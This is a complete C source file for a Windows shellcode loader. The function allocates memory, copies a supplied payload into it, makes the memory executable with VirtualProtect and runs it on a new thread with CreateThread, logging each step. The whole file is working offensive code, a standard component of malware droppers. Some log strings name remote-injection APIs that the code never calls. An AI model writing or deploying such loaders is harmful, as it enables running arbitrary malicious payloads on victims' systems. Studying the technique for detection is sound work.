#include "ShellcodeInjection.h"

BOOL ShellcodeInjection
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL	State			= TRUE;
	PVOID	PayloadBuffer	= NULL;
	PVOID	ThreadHandle	= NULL;
	DWORD	dwOldProtection = 0;

	if (!(PayloadBuffer = VirtualAlloc(NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to PayloadBuffer!", PayloadSize);
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully allocated %zu Bytes to PayloadBuffer!", PayloadSize);

	RtlCopyMemory(PayloadBuffer, Payload, PayloadSize);

	INFO("Successfully Wrote %zu Bytes to Target Process!", PayloadSize);
	INFO("Base Address --> [0x%p] Buffer Address --> {0x%p]", PayloadBuffer, Payload);

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &dwOldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Changed! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if ((ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadBuffer, NULL, 0, NULL)) == NULL)
	{
		WARN("Failed To Create a new Thread Pointing to Our Payload!");
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Newly Created Thread! Pointing to Payload Buffer --> [0x%p]", PayloadBuffer);
	INFO("Waiting For Thread To Finish Executing...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}